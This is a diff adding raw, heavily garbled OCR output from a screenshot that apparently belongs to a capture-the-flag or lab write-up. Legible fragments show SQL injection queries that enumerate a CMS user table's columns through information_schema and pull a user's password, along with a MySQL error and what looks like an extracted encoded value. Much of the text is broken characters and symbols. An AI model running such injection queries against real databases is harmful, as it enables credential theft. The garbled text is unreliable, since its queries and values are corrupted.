@@ -1,0 +1,19 @@
+# OCR: 3b4ed709713a9d64efad89ced256bd27.webp
+# 来源: .\02-WriteUp\2025\3b4ed709713a9d64efad89ced256bd27.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:26
+
+ay_role_level8 BBay_site BBay_slide
+a ay_Syslog Pay _tags@ EQay_typeg 。Bay_user
+1ay_user_roleg "® "
+K Bselect group_concat(column_name) from information_schema.columns where table_schema=database() and ta
+园 68/ def  Bgroup_concat(column_name) 1 9 4 目 B “ u 酯 id,ucode,username,realname,passWord ,
+date_user,create_time,update_timeg BO “
+7 Bselect password from ay_user while username="xiaoming"
+8 6(B#42886You have an error in your SQL syntax; check the manual that corresponds to your MySQL server
+le username="xiaoming"' at line 1
+7 select password from ay_user where Username= “
+I GE< BdeffipbootcnmsBiay_userBiay_userpassuordBpassuord1 ~
+EMXFhejJ3c3g=0 B4 日
+E 24, 7 国 颖 SO, 62 n
+整 个 对 话 (27 kB) s 旺 示 为 UIF-8 志 No delta times 一
